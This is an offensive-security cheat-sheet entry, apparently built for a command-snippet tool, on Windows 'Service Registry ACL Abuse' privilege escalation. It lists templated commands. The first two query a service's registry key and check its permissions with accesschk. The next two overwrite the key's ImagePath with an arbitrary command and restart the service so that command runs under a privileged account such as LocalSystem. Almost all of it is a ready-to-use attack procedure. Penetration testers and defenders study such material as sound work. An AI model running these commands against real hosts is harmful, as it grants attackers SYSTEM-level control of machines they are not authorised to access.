---
technique: Service Registry ACL Abuse
category: privilege-escalation
targets: Windows Services
protocols: Local
remote_capable: false
tags: windows privilege-escalation services registry acl
---

# Service Registry ACL Abuse

Service registry ACL abuse modifies service configuration through writable registry keys when SCM permissions are more restrictive.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable service key | Operator must write to the target service registry key |
| Privileged service account | Service should run as LocalSystem or another privileged account |
| Restart trigger | Service restart or host reboot is needed to apply changes |

## Windows

### Query service key

#cmd #registry #services

Query a service registry key.

```cmd title:"Query service registry key"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\$service_name"
```
<!-- cheat
var service_name
-->

### Check key permissions

#cmd #accesschk #registry

Check permissions on a service registry key.

```cmd title:"Check service registry key permissions"
accesschk.exe -k "HKLM\SYSTEM\CurrentControlSet\Services\$service_name"
```
<!-- cheat
var service_name
-->

### Step 1: Set service ImagePath

#cmd #registry #services

Set the service ImagePath through the registry.

```cmd title:"Set service ImagePath in registry"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\$service_name" /v ImagePath /t REG_EXPAND_SZ /d "$command" /f
```
<!-- cheat
var service_name
var command
-->

### Step 2: Restart service

#cmd #services

Restart the modified service.

```cmd title:"Restart modified service"
sc start "$service_name"
```
<!-- cheat
var service_name
-->

## Linux

No Linux operator command is included here. This note covers Windows service registry ACL abuse.
